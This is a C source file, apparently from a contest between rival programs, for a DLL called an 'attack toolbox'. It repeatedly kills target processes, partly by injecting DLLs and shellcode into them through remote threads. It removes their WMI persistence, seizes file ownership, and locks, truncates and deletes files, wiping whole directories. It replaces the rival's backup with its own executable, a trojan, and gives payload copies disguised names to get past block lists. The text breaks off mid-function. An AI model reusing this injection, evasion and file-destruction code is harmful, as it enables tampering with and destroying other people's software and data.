/*
 * atkcore.dll - 精简攻击工具箱
 * 功能：循环扫描并终止 yy.exe / ww.exe
 * 保留五种结束方式：
 *   1. TerminateProcess
 *   2. CreateRemoteThread + ExitProcess
 *   3. 注入 payload.dll
 *   4. 注入 payload.bin（位置无关 shellcode，可绕过签名检查）
 *   5. Job 对象终止
 * 另含：删对手 WMI 复活订阅三件套、杀进程树 + 源文件先锁死再删除、清空对方目录
 * 编译器：GNU GCC (MinGW-w64)
 * 编译选项：-shared -o atkcore.dll killtools.c -luser32 -lkernel32 -ladvapi32
 *           -lole32 -loleaut32 -lwbemuuid -static -s -O2
 */

#define WIN32_LEAN_AND_MEAN
#define _WIN32_DCOM
#include <windows.h>
#include <tlhelp32.h>
#include <wbemidl.h>
#include <stdio.h>
#include <stdarg.h>
#include <time.h>

/* 目标进程名。注意：**只把 yy.exe/ww.exe 当"无条件全杀"的核心目标**。
   lenovo_fix.exe 是 yy 的蜜罐子进程，也是它的复活锚点：我们每 30ms 杀一次、
   它就按 yy 的逻辑重新拉起一次并重建 WMI 订阅（自愈），纯杀是白费力气。
   它归"子进程策略"管：有弹窗 -> 注入进去疯狂嘲讽；没弹窗 -> 才杀。 */
static const WCHAR *g_targets[] = { L"yy.exe", L"ww.exe", L"lenovo_fix.exe", NULL };
static const WCHAR *g_hostTargets[] = { L"notepad.exe", NULL };

static BOOL IsTargetName(LPCWSTR name)
{
    if (!name) return FALSE;
    for (int i = 0; g_targets[i]; i++)
        if (_wcsicmp(name, g_targets[i]) == 0) return TRUE;
    return FALSE;
}

/* 对方目录现在是整目录清空（除我方文件名外全部先锁死再删除），
   不再需要按名单逐个删。 */

#define MAX_LOCKS 32
static HANDLE g_hLocks[MAX_LOCKS];
static WCHAR  g_lockPaths[MAX_LOCKS][MAX_PATH];
static volatile LONG g_nLocks = 0;

/* 全局控制 */
static volatile LONG g_bRunning = 0;
static HANDLE g_hThread = NULL;

/* 共享内存布局与命名常量：唯一来源见 xxipc.h */
#include "xxipc.h"

/* ---- 构建标记导出：注入方/加载方用它校验"拿到的确实是同一版二进制" ---- */
__declspec(dllexport) const char * WINAPI XxBuildTag(void) { return "v7"; }
static CRITICAL_SECTION g_csLog;
static BOOL g_csLogInit = FALSE;
static HANDLE g_hSharedMap = NULL;
static PVOID  g_pSharedView = NULL;
static HANDLE g_hSingleton = NULL;    /* 进程内单例（持有到进程结束） */
static HMODULE g_hSelfModule = NULL;  /* 自身模块句柄（摘 PEB 链前缓存） */
static WCHAR g_szPayloadCopy[MAX_PATH] = L"";   /* payload.dll 的改名副本 */
static WCHAR g_szPayloadBinCopy[MAX_PATH] = L"";

/* ================== 会话随机名 token（方案 A） ================== */
static ULONGLONG g_dwNameToken = 0;

static ULONGLONG NameTok(void)
{
    if (g_dwNameToken) return g_dwNameToken;
    if (g_pSharedView) {
        ULONGLONG s = XX_NAME_TOKEN64(g_pSharedView);
        if (s) return s;
    }
    return XX_NAME_TOKEN_FIXED;
}

__declspec(dllexport) BOOL WINAPI XxSetNames(const XX_NAME_BLOCK *pBlock)
{
    ULONGLONG tok = 0;
    if (!XXNameBlockTake(pBlock, &tok, NULL)) return FALSE;
    if (tok) g_dwNameToken = tok;
    return TRUE;
}

/* 方案 A：远程把会话随机名送进目标进程（调用它的 XxSetNames，读完清零并释放）。
   放在 WriteKillLog 之前，所以这里只用返回值不做日志（调用方自己记）。 */
static BOOL GetRemoteExportRva(LPCWSTR localDllPath, const char *funcName, DWORD *pRva)
{
    HMODULE hMap = LoadLibraryExW(localDllPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
    FARPROC pfn;
    if (!hMap) return FALSE;
    pfn = GetProcAddress(hMap, funcName);
    if (!pfn) { FreeLibrary(hMap); return FALSE; }
    *pRva = (DWORD)((ULONG_PTR)pfn - (ULONG_PTR)hMap);
    FreeLibrary(hMap);
    return TRUE;
}

static BOOL PushNamesRemote(HANDLE hProc, HMODULE hRemoteMod, LPCWSTR localDllPath, DWORD pid)
{
    DWORD rva = 0;
    XX_NAME_BLOCK blk, zero;
    LPVOID pBlk;
    HANDLE h;
    BOOL ok = FALSE;

    if (!hProc || !hRemoteMod || !localDllPath || !localDllPath[0]) return FALSE;
    if (!GetRemoteExportRva(localDllPath, "XxSetNames", &rva)) return FALSE;

    XXNameBlockInit(&blk, NameTok(), 0);
    pBlk = VirtualAllocEx(hProc, NULL, sizeof(blk), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!pBlk) return FALSE;
    if (!WriteProcessMemory(hProc, pBlk, &blk, sizeof(blk), NULL)) {
        VirtualFreeEx(hProc, pBlk, 0, MEM_RELEASE);
        return FALSE;
    }
    h = CreateRemoteThread(hProc, NULL, 0,
                           (LPTHREAD_START_ROUTINE)((BYTE *)hRemoteMod + rva), pBlk, 0, NULL);
    if (h) { WaitForSingleObject(h, 2000); CloseHandle(h); ok = TRUE; }
    memset(&zero, 0, sizeof(zero));
    WriteProcessMemory(hProc, pBlk, &zero, sizeof(zero), NULL);   /* 读后即删 */
    VirtualFreeEx(hProc, pBlk, 0, MEM_RELEASE);
    return ok;
}

static void EnsureLogInit(void)
{
    if (g_csLogInit) return;
    InitializeCriticalSection(&g_csLog);
    g_csLogInit = TRUE;
    g_hSharedMap = XXOpenShared();
    if (g_hSharedMap)
        g_pSharedView = MapViewOfFile(g_hSharedMap, FILE_MAP_READ | FILE_MAP_WRITE, 0, 0, SHARED_MEM_SIZE);
}

/* 详细日志：共享内存（弹窗里看）+ **%TEMP%\xx_debug.log**（没有弹窗时必须靠它）。
   用户明确要求"杀进程/锁死文件/删除文件都写点日志" —— 只写共享内存的话，
   一旦没有弹窗（或弹窗被对端干掉）就完全看不到发生了什么。 */
static void WriteKillLog(const WCHAR *format, ...)
{
    WCHAR szLine[512];
    WCHAR fline[640];
    va_list args;

    EnsureLogInit();

    va_start(args, format);
    _vsnwprintf(szLine, _countof(szLine) - 1, format, args);
    va_end(args);
    szLine[_countof(szLine) - 1] = L'\0';

    /* 先落文件：g_pSharedView 为空时也要能看到 */
    _snwprintf(fline, _countof(fline) - 1, L"[kill][pid=%lu] %s\r\n",
               GetCurrentProcessId(), szLine);
    fline[_countof(fline) - 1] = L'\0';
    XXFileLog(fline);

    if (!g_pSharedView) return;

    SYSTEMTIME st;
    GetLocalTime(&st);
    WCHAR entry[600];
    _snwprintf(entry, _countof(entry) - 1, L"[%02d:%02d:%02d.%03d] [kill] %s\r\n",
               st.wHour, st.wMinute, st.wSecond, st.wMilliseconds, szLine);
    entry[_countof(entry) - 1] = L'\0';

    EnterCriticalSection(&g_csLog);
    WCHAR *pLog = (WCHAR *)((BYTE *)g_pSharedView + OFFSET_LOG);
    size_t maxLen = (LOG_SIZE / sizeof(WCHAR)) - 1;
    size_t len = XXLogLen(pLog, maxLen + 1);
    if (len > maxLen) { pLog[maxLen] = L'\0'; len = maxLen; }
    size_t newLen = wcslen(entry);
    if (len + newLen <= maxLen)
    {
        /* 第二参是缓冲区总容量（含结尾 NUL），不是剩余空间 */
        wcscat_s(pLog, maxLen + 1 - len, entry);
    }
    else
    {
        /* 丢掉最旧的一段，只保留最近 maxLen 个字符 */
        size_t drop = len + newLen - maxLen;
        if (drop < len) {
            memmove(pLog, pLog + drop, (len - drop) * sizeof(WCHAR));
            pLog[len - drop] = L'\0';
        } else {
            pLog[0] = L'\0';
        }
        wcscat_s(pLog, maxLen + 1 - wcslen(pLog), entry);
    }
    LeaveCriticalSection(&g_csLog);
}

/* 结束对方进程后，把它的 exe 和同目录二进制清掉。
   现在统一走"先锁死（删除待决）再删除"：LockThenDeleteFile 逐个文件处理，
   并清空整个敌人目录（见 WipeDirPass）。名单必须拼在"敌人 exe 所在目录"下：
   原来的相对路径删的是当前工作目录（xx 被 window/svcguard 拉起时继承宿主进程
   的 CWD，可能是 System32）。 */

/* ================== 删掉对手的 WMI 复活订阅（三件套全删） ==================
   yy 的复活链是 __EventFilter "YY_RespawnFilter" + CommandLineEventConsumer
   "YY_RespawnConsumer" + 连接两者的 __FilterToConsumerBinding。
   对手自己删我们的订阅时只删了 Filter/Consumer、漏掉 Binding（yybad.md 4.x），
   残留的绑定会继续引用对象，WMI 仓库有时会把对象当成"仍被引用"。
   所以这里三件套都删，顺序必须是 **Binding → Consumer → Filter**，并循环校验。
   另外顺带扫掉所有名字以 YY_ 开头的事件过滤器/消费者（对手换个名字也能盖住）。 */
#define YY_FILTER_NAME   L"YY_RespawnFilter"
#define YY_CONSUMER_NAME L"YY_RespawnConsumer"

static int DeleteWmiInstanceByName(IWbemServices *pSvc, LPCWSTR cls, LPCWSTR name)
{
    WCHAR path[256];
    HRESULT hr;

    _snwprintf(path, _countof(path) - 1, L"%s.Name=\"%s\"", cls, name);
    path[_countof(path) - 1] = L'\0';
    hr = pSvc->lpVtbl->DeleteInstance(pSvc, path, 0, NULL, NULL);
    return SUCCEEDED(hr) ? 1 : 0;
}

/* 扫掉引用了对手 Filter/Consumer 的绑定（含悬空绑定） */
static int DeleteWmiBindings(IWbemServices *pSvc)
{
    IEnumWbemClassObject *pEnum = NULL;
    HRESULT hr;
    int n = 0;

    hr = pSvc->lpVtbl->ExecQuery(pSvc, L"WQL",
                                 L"SELECT * FROM __FilterToConsumerBinding",
                                 WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                                 NULL, &pEnum);
    if (SUCCEEDED(hr) && pEnum) {
        IWbemClassObject *pObj = NULL;
        ULONG got = 0;
        while (pEnum->lpVtbl->Next(pEnum, WBEM_INFINITE, 1, &pObj, &got) == S_OK && got == 1) {
            VARIANT vF, vC;
            BOOL bEnemy = FALSE;
            VariantInit(&vF);
            VariantInit(&vC);
            if (SUCCEEDED(pObj->lpVtbl->Get(pObj, L"Filter", 0, &vF, NULL, NULL)) &&
                vF.vt == VT_BSTR && vF.bstrVal &&
                (wcsstr(vF.bstrVal, L"YY_") || wcsstr(vF.bstrVal, YY_FILTER_NAME)))
                bEnemy = TRUE;
            if (SUCCEEDED(pObj->lpVtbl->Get(pObj, L"Consumer", 0, &vC, NULL, NULL)) &&
                vC.vt == VT_BSTR && vC.bstrVal &&
                (wcsstr(vC.bstrVal, L"YY_") || wcsstr(vC.bstrVal, YY_CONSUMER_NAME)))
                bEnemy = TRUE;

            if (bEnemy) {
                VARIANT vPath;
                VariantInit(&vPath);
                if (SUCCEEDED(pObj->lpVtbl->Get(pObj, L"__RELPATH", 0, &vPath, NULL, NULL)) &&
                    vPath.vt == VT_BSTR && vPath.bstrVal) {
                    if (SUCCEEDED(pSvc->lpVtbl->DeleteInstance(pSvc, vPath.bstrVal, 0, NULL, NULL)))
                        n++;
                }
                VariantClear(&vPath);
            }
            VariantClear(&vF);
            VariantClear(&vC);
            pObj->lpVtbl->Release(pObj);
            pObj = NULL;
        }
        pEnum->lpVtbl->Release(pEnum);
    }
    return n;
}

/* 扫掉名字以 YY_ 开头的事件过滤器 / 消费者（对手改名也躲不掉） */
static int DeleteWmiByPrefix(IWbemServices *pSvc, LPCWSTR cls)
{
    WCHAR query[256];
    IEnumWbemClassObject *pEnum = NULL;
    HRESULT hr;
    int n = 0;

    _snwprintf(query, _countof(query) - 1, L"SELECT * FROM %s WHERE Name LIKE 'YY\\_%%'", cls);
    query[_countof(query) - 1] = L'\0';

    hr = pSvc->lpVtbl->ExecQuery(pSvc, L"WQL", query,
                                 WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY,
                                 NULL, &pEnum);
    if (SUCCEEDED(hr) && pEnum) {
        IWbemClassObject *pObj = NULL;
        ULONG got = 0;
        while (pEnum->lpVtbl->Next(pEnum, WBEM_INFINITE, 1, &pObj, &got) == S_OK && got == 1) {
            VARIANT vPath;
            VariantInit(&vPath);
            if (SUCCEEDED(pObj->lpVtbl->Get(pObj, L"__RELPATH", 0, &vPath, NULL, NULL)) &&
                vPath.vt == VT_BSTR && vPath.bstrVal) {
                if (SUCCEEDED(pSvc->lpVtbl->DeleteInstance(pSvc, vPath.bstrVal, 0, NULL, NULL)))
                    n++;
            }
            VariantClear(&vPath);
            pObj->lpVtbl->Release(pObj);
            pObj = NULL;
        }
        pEnum->lpVtbl->Release(pEnum);
    }
    return n;
}

static void RemoveEnemyWmi(void)
{
    IWbemLocator *pLoc = NULL;
    IWbemServices *pSvc = NULL;
    HRESULT hr;
    int pass, n = 0;

    /* 模式冲突（RPC_E_CHANGED_MODE）也要继续：宿主进程可能已经按 STA 初始化过 COM */
    hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return;

    hr = CoCreateInstance(&CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER,
                          &IID_IWbemLocator, (void **)&pLoc);
    if (FAILED(hr) || !pLoc) {
        CoUninitialize();
        return;
    }

    /* 必须连 ROOT\SUBSCRIPTION：CommandLineEventConsumer 只定义在这里 */
    hr = pLoc->lpVtbl->ConnectServer(pLoc, L"ROOT\\SUBSCRIPTION", NULL, NULL, NULL, 0,
                                     NULL, NULL, &pSvc);
    if (SUCCEEDED(hr) && pSvc) {
        for (pass = 0; pass < 3; pass++) {
            int d = 0;
            d += DeleteWmiBindings(pSvc);                       /* 1) 先断连接 */
            d += DeleteWmiByPrefix(pSvc, L"CommandLineEventConsumer");
            d += DeleteWmiByPrefix(pSvc, L"__EventFilter");
            d += DeleteWmiInstanceByName(pSvc, L"CommandLineEventConsumer", YY_CONSUMER_NAME);
            d += DeleteWmiInstanceByName(pSvc, L"__EventFilter", YY_FILTER_NAME);
            n += d;
            if (!d) break;                                      /* 没有可删的就收工 */
        }
        pSvc->lpVtbl->Release(pSvc);
    }
    pLoc->lpVtbl->Release(pLoc);
    CoUninitialize();

    if (n) WriteKillLog(L"已删除对手 WMI 复活订阅 %d 个对象（Binding/Consumer/Filter 三件套）", n);
}

/* ================== 注入用 payload 副本（改名 + %TEMP%） ==================
   对手按名字拦/删 payload.dll、payload.bin，换成 %TEMP% 下的随机"系统 dll"名即可
   同时绕过反注入名单和删文件名单；副本被删会在下一轮重做。 */
static BOOL TryAllMethods(LPCWSTR exeName, DWORD pid);      /* 前置声明 */
static BOOL GetProcessPath(DWORD pid, WCHAR *path, DWORD cch);
static void GetKillerPath(WCHAR *buf, SIZE_T size);
static void GetKillerBinPath(WCHAR *buf, SIZE_T size);

static void RefreshKillerCopies(void)
{
    WCHAR src[MAX_PATH];
    DWORD salt = 0x9E3779B9u;

    if (!g_pSharedView) EnsureLogInit();
    if (g_pSharedView) {
        salt = XX_TMP_SALT(g_pSharedView);
        if (salt == 0) salt = 0x9E3779B9u;
    }

    GetKillerPath(src, MAX_PATH);
    if (src[0]) XXMakeTempCopy(src, salt, g_szPayloadCopy, MAX_PATH);

    GetKillerBinPath(src, MAX_PATH);
    if (src[0]) XXMakeTempCopy(src, salt ^ 0x5BD1E995u, g_szPayloadBinCopy, MAX_PATH);
}

/* ================== "先锁死再删除" ==================
   置"删除待决"（FileDispositionInfo）是同时满足两件事的唯一做法：
     - 文件被标记删除后，按名字再打开一律被拒（对手既不能执行也不能改写）；
     - 最后一个句柄关闭时文件即刻消失。
   对正在运行的镜像同样有效：镜像被 section 撑住，进程一退出文件就没了。 */
static BOOL LockThenDeleteFile(LPCWSTR path)
{
    HANDLE h;
    FILE_DISPOSITION_INFO fdi;
    DWORD err = 0;

    if (!path || !path[0]) return FALSE;

    /* 先夺权：对手给自己的文件设了 deny-DELETE DACL（正是我们从 yy 的
       GetNamedSecurityInfo/SetNamedSecurityInfo/SetEntriesInAcl 导入里学到的做法），
       不先把 owner/DACL 抢过来，后面的 CreateFile(DELETE) 一律 ACCESS_DENIED。 */
    if (XXGrantFullControl(path))
        WriteKillLog(L"已夺取所有权并重建 DACL: %ls", path);
    SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL);

    h = CreateFileW(path, GENERIC_READ | DELETE,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        /* 退一步：只带 DELETE 打开（有些文件不允许读但允许删） */
        h = CreateFileW(path, DELETE,
                        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                        NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    }
    if (h == INVALID_HANDLE_VALUE) {
        /* 最后兜底：直接删（对没有独占句柄的文件有效） */
        err = GetLastError();
        SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL);
        if (DeleteFileW(path)) {
            WriteKillLog(L"锁死删除: %s（直接删，打开句柄失败 err=%lu）", path, err);
            return TRUE;
        }
        WriteKillLog(L"锁死删除失败: %s（打开失败 err=%lu，DeleteFile 也失败 err=%lu）",
                     path, err, GetLastError());
        return FALSE;
    }

    fdi.DeleteFile = TRUE;
    if (!SetFileInformationByHandle(h, FileDispositionInfo, &fdi, sizeof(fdi)))
        err = GetLastError();
    CloseHandle(h);                       /* 关掉最后一个句柄 → 真正删除 */
    SetFileAttributesW(path, FILE_ATTRIBUTE_NORMAL);
    if (GetFileAttributesW(path) == INVALID_FILE_ATTRIBUTES) {
        WriteKillLog(L"锁死并删除成功: %s", path);
        return TRUE;
    }
    if (DeleteFileW(path)) {
        WriteKillLog(L"锁死删除: %s（删除待决没生效 err=%lu，DeleteFile 成功）", path, err);
        return TRUE;
    }
    WriteKillLog(L"锁死删除失败: %s（删除待决 err=%lu，DeleteFile err=%lu）",
                 path, err, GetLastError());
    return FALSE;
}

/* ================== 清空并**保持锁住**（对付 yy 的自我备份/还原链） ==================
   为什么不是"删掉就完事"：yy.exe 自己会把自己的镜像**再备份**成 <dir>\yyres.bin
   （见 yy.exe 里 CopyFileW + "yyres.bin" 的两处），删一次它下一轮又补回来。
   这里改成：打开 → **截断成 0 字节** → **句柄不关**（GENERIC_READ|WRITE、无共享）。
   效果：
     · 它想 CopyFileW(yyres.bin → yy.exe) → 共享冲突，失败；
     · 就算绕过（比如先删），文件内容也是 0 字节 → 还原出的 yy.exe 是空文件 → CreateProcess 必失败。
   句柄一直留到我方进程结束（最多 8 个，够用；句柄本身几乎不占资源）。 */
static HANDLE g_holdFiles[8];
static WCHAR  g_holdPaths[8][MAX_PATH];
static int    g_nHolds = 0;

static BOOL NeutralizeFile(LPCWSTR path)
{
    HANDLE h;
    LARGE_INTEGER zero;
    int i;

    if (!path || !path[0]) return FALSE;
    for (i = 0; i < g_nHolds; i++)
        if (_wcsicmp(g_holdPaths[i], path) == 0) return TRUE;    /* 已经锁住 */

    h = CreateFileW(path, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                    FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        h = CreateFileW(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    }
    if (h == INVALID_HANDLE_VALUE) {
        DWORD e = GetLastError();
        /* 打不开就退化成"锁死删除"（它至少没了这个文件） */
        if (LockThenDeleteFile(path)) return TRUE;
        WriteKillLog(L"清空锁住失败: %s err=%lu", path, e);
        return FALSE;
    }

    zero.QuadPart = 0;
    SetFilePointerEx(h, zero, NULL, FILE_BEGIN);
    if (!SetEndOfFile(h))
        WriteKillLog(L"截断失败（仍然持锁）: %s err=%lu", path, GetLastError());

    if (g_nHolds < 8) {                       /* 句柄**不关**：锁一直有效 */
        g_holdFiles[g_nHolds] = h;
        wcsncpy_s(g_holdPaths[g_nHolds], MAX_PATH, path, _TRUNCATE);
        g_nHolds++;
    } else {
        CloseHandle(h);
    }
    WriteKillLog(L"已清空并锁住（yy 的还原源失效）: %s", path);
    return TRUE;
}
/* 我方文件名：清空敌人目录时绝不能顺手删掉自己的东西 */
static const WCHAR *g_ownNames[] = {
    L"xx.exe", NULL,   /* 备份文件名每会话随机，见 XXBackupNameW */ L"svcguard.dll", L"window.dll", L"atkcore.dll",
    L"payload.dll", L"payload.bin", L"guard.dll", L"defense.dll", NULL
};

static BOOL IsOwnFileName(LPCWSTR leaf)
{
    int i;
    for (i = 0; g_ownNames[i]; i++)
        if (_wcsicmp(leaf, g_ownNames[i]) == 0) return TRUE;
    return FALSE;
}

/* #19：把对手的自备份文件内容**改写成我方内容**（不是删掉）。
   yy 从 yyres.bin 复活时，还原出来的"自己"其实是 xx.exe 的字节 ——
   它越复活越是在帮我们跑。源用我们自己的备份文件（就是 xx.exe 的备份），
   没准备好就直接用 xx.exe 本体。 */
static void GetOwnDir(WCHAR *dir, SIZE_T cch);      /* 前置声明（定义在下方） */

static BOOL TrojanEnemyBackup(LPCWSTR dir, LPCWSTR leaf)
{
    WCHAR dst[MAX_PATH], src[MAX_PATH], ownDir[MAX_PATH];

    GetOwnDir(ownDir, MAX_PATH);
    if (!ownDir[0]) return FALSE;
    swprintf_s(dst, MAX_PATH, L"%s%s", dir, leaf);
    {   /* 随机备份名（会话盐派生） */
        WCHAR nm[32];
        XXBackupNameW(g_pSharedView, nm, _countof(nm));
        swprintf_s(src, MAX_PATH, L"%s%ls", ownDir, nm);
        SecureZeroMemory(nm, sizeof(nm));
    }
    if (GetFileAttributesW(src) == INVALID_FILE_ATTRIBUTES)
        swprintf_s(src, MAX_PATH, L"%sxx.exe", ownDir);
    if (GetFileAttributesW(src) == INVALID_FILE_ATTRIBUTES) return FALSE;

    SetFileAttributesW(dst, FILE_ATTRIBUTE_NORMAL);
    DeleteFileW(dst);                 /* 先清掉旧内容（对手可能给它加了占位锁） */
    if (CopyFileW(src, dst, FALSE)) {
        WriteKillLog(L"已把对手备份改写成我方内容: %s", dst);
        return TRUE;
    }
    WriteKillLog(L"改写对手备份失败: %s err=%lu", dst, GetLastError());
    return FALSE;
}

/* 判断是不是对手的备份文件（yyres.bin / yyres*.bin） */
static BOOL IsEnemyBackupName(LPCWSTR leaf)
{
    size_t n = wcslen(leaf);
    if (n < 8) return FALSE;
    if (_wcsnicmp(leaf, L"yyres", 5) != 0) return FALSE;
    return (_wcsicmp(leaf + n - 4, L".bin") == 0);
}

/* 清空敌人目录：逐个文件"先锁死再删除"，自己的文件名跳过；
   对手的自备份则改写成我方内容而不是删除（#19）。 */
/* 目标 exe 所在目录是不是"系统临时目录"。
   为什么必须区分：yy 的蜜罐 lenovo_fix.exe 就住在 %TEMP%，若按"被杀进程所在目录"
   去整目录清空，等于把**整个 %TEMP% 删一遍** —— 那包括我们自己的注入副本
   （sechostXXXX.dll 之类）和机器上其它程序的临时文件。实测后果：我们的副本被删 →
   反复重新复制注入，机器上别的程序也会莫名其妙丢文件。 */
static BOOL IsSystemTempDir(LPCWSTR dir)
{
    WCHAR tmp[MAX_PATH];
    DWORD n;

    if (!dir || !dir[0]) return FALSE;
    n = GetTempPathW(MAX_PATH, tmp);
    if (n == 0 || n >= MAX_PATH) return FALSE;
    while (n > 0 && (tmp[n - 1] == L'\\' || tmp[n - 1] == L'/')) tmp[--n] = L'\0';
    if (n == 0) return FALSE;
    if (_wcsnicmp(dir, tmp, n) != 0) return FALSE;
    /* 必须是"%TEMP%\" 本身，不是 %TEMP%\sub 这种子目录 */
    return (dir[n] == L'\0' || (dir[n] == L'\\' && dir[n + 1] == L'\0')) ? TRUE : FALSE;
}

static void WipeDirPass(LPCWSTR dir)
{
    WCHAR pattern[MAX_PATH];
    WIN32_FIND_DATAW fd;
    HANDLE hFind;
    int n = 0;

    if (!dir || !dir[0]) return;
    /* 系统临时目录**不做整目录清空**：只删该进程自己的镜像（由 KillProcessTree 里的
       WipeTreeEntry 负责），蜜罐的复活源由 BlockHoneypotRespawn 锁住。 */
    if (IsSystemTempDir(dir)) {
        WriteKillLog(L"跳过整目录清空：%s 是系统临时目录（只处理该进程自己的镜像）", dir);
        return;
    }
    swprintf_s(pattern, MAX_PATH, L"%s*", dir);

    hFind = FindFirstFileW(pattern, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        WCHAR full[MAX_PATH];
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;   /* 只清文件 */
        if (IsOwnFileName(fd.cFileName)) continue;                     /* 别删自己 */
        if (IsEnemyBackupName(fd.cFileName)) {                         /* #19：改写而不是删 */
            if (TrojanEnemyBackup(dir, fd.cFileName)) n++;
            continue;
        }
        swprintf_s(full, MAX_PATH, L"%s%s", dir, fd.cFileName);
        if (LockThenDeleteFile(full)) n++;
    } while (FindNextFileW(hFind, &fd));
    FindClose(hFind);

    WriteKillLog(L"清空对方目录: %s 删除 %d 个文件", dir, n);
}

/* 杀死 yy 之后由**新线程**执行：把 yy 目录下所有文件先锁死再删除 */
static DWORD WINAPI WipeEnemyDirThread(LPVOID lp)
{
    WCHAR dir[MAX_PATH];
    if (!lp) return 0;
    wcsncpy_s(dir, MAX_PATH, (LPCWSTR)lp, _TRUNCATE);
    LocalFree(lp);

    Sleep(60);             /* 让"杀进程"先落定（频率要求 <80ms） */
    WipeDirPass(dir);
    Sleep(70);             /* 对方常在同一目录重建，隔一会儿再清（<80ms，由外层的重复清理兜住） */
    WipeDirPass(dir);
    return 0;
}

static void SpawnWipeEnemyDir(LPCWSTR exePath)
{
    WCHAR dir[MAX_PATH];
    LPWSTR arg;
    SIZE_T cb;

    if (!exePath || !exePath[0]) return;
    wcsncpy_s(dir, MAX_PATH, exePath, _TRUNCATE);
    {
        WCHAR *p = wcsrchr(dir, L'\\');
        if (p) p[1] = L'\0'; else return;
    }

    cb = (wcslen(dir) + 1) * sizeof(WCHAR);
    arg = (LPWSTR)LocalAlloc(LPTR, cb);
    if (!arg) return;
    memcpy(arg, dir, cb);

    if (!CreateThread(NULL, 0, WipeEnemyDirThread, (LPVOID)arg, 0, NULL))
        LocalFree(arg);
}

/* 收进程树（含自己），最多 MAX_TREE 个 */
/* ================== 收进程树 + 杀树（参考 AntierX 的 kill_process_tree） ==================
   关键改动（用户反馈"进程树没有被结束"）：
     ① **只快照一次**，用父子表做 BFS（原来每层重新快照：中途新起的子进程会让"层"错乱，
        而且 6 层 × 全表枚举很慢）；
     ② 记录 depth，**按深度降序杀**（叶子先杀，根最后），防止父进程在被杀时又拉起子进程；
     ③ 每个进程杀完都 `WaitForSingleObject(SYNCHRONIZE)` **等它真的退出**（原来不看结果，
        "Terminate 返回 TRUE" 不等于"进程已经没了"），没退出就补一刀再等；
     ④ 收尾再扫一遍，把这一轮里新冒出来的子进程也补杀掉。
   AntierX 的对应实现（E:\Python\AntierX\cpp\src\ai\ai_tools_process.cpp
   的 t_kill_process_tree）也是这个套路：一次快照建 kids 表 → 深度降序 → TerminateProcess
   + WaitForSingleObject → 逐个记录 ok/error。 */
#define MAX_TREE 128
#define MAX_SNAP 2048
typedef struct { DWORD pid; int depth; WCHAR path[MAX_PATH]; } TreeEntry;

/* 单个进程的源文件：先锁死（删除待决）再删除 */
static void WipeTreeEntry(TreeEntry *e)
{
    if (!e || !e->path[0]) return;
    if (LockThenDeleteFile(e->path))
        WriteKillLog(L"已锁死并删除源文件: %s", e->path);
    else
        WriteKillLog(L"源文件锁删失败: %s", e->path);
}

/* ================== 掐断 yy 的复活源（读完 testyy 的汇编后加的） ==================
   yy.exe 的 yyguaard.dll（注入到每个 yy 进程和若干宿主）里那段循环是：

       每 150ms：
         cnt = 数进程表里叫 yy.exe 的进程数
         if (cnt <= 0)  → 去 spawn
         if (FindWindowW(L"YYWnd_7f3a9c1e") == NULL) {          // 没有主窗口 = 认为全挂了
              if (1500ms 到了) { 杀光**所有** yy.exe；cnt = 重新数 }
         }
         if (cnt >= 3) → 只 sleep，不 spawn
         if (距上次 spawn < 250ms) → 只 sleep
         if (<dir>\yy.exe 不存在) CopyFileW(<dir>\yyres.bin → <dir>\yy.exe)   // 从备份还原
                                  失败再 CopyFileW(%TEMP%\yy_backup_7f3a9c1e.dat → …)
         CreateProcessW(<dir>\yy.exe, NULL, cwd=<dir>)       // 起一个新副本

   这就是"启动后疯狂启动副本"的来源：**每个**被注入的 guard 都独立跑这段，没有单例/互斥；
   没有主窗口时它们先互相把 yy.exe 杀光，再各自补一个，于是 杀→补→杀→补 无限循环。
   我们的对策很直接：**把它的"备料"锁死**——它还原/启动都要读这些文件，读不到就彻底哑火。

   注意：这些文件必须**先锁死（删除待决、独占、不给共享读）再删除**，
   这样 guard 的 CopyFileW / CreateProcessW 都会失败（文件在、但打不开 = 没有可启动的镜像）。 */
static void KillYyRespawnSources(LPCWSTR enemyExePath)
{
    WCHAR dir[MAX_PATH] = L"";
    WCHAR p[MAX_PATH];
    WCHAR temp[MAX_PATH];
    const WCHAR *slash;

    if (enemyExePath && enemyExePath[0]) {
        wcsncpy_s(dir, MAX_PATH, enemyExePath, _TRUNCATE);
        slash = wcsrchr(dir, L'\\');
        if (slash) dir[slash - dir + 1] = L'\0';
    }
    if (dir[0]) {
        /* ① 还原源：yyres.bin（guard 直接用它覆盖出 yy.exe） */
        swprintf_s(p, MAX_PATH, L"%lsyyres.bin", dir);
        NeutralizeFile(p);

        /* ② guard 本体：锁死后新起的 yy 副本/注入都读不到它（Spread 直接失效） */
        swprintf_s(p, MAX_PATH, L"%lsyyguard.dll", dir);
        if (LockThenDeleteFile(p)) WriteKillLog(L"已锁死并删除 yyguaard.dll: %s", p);
    }

    /* ③ %TEMP% 里的第二份备份（guard 的 CopyFileW 备用源） */
    if (GetTempPathW(MAX_PATH, temp)) {
        swprintf_s(p, MAX_PATH, L"%lsyy_backup_7f3a9c1e.dat", temp);
        NeutralizeFile(p);
    }
}
/* 等某个 pid 真的退出；打不开当已退出（可能刚死/被保护） */
static BOOL WaitPidExit(DWORD pid, DWORD ms)
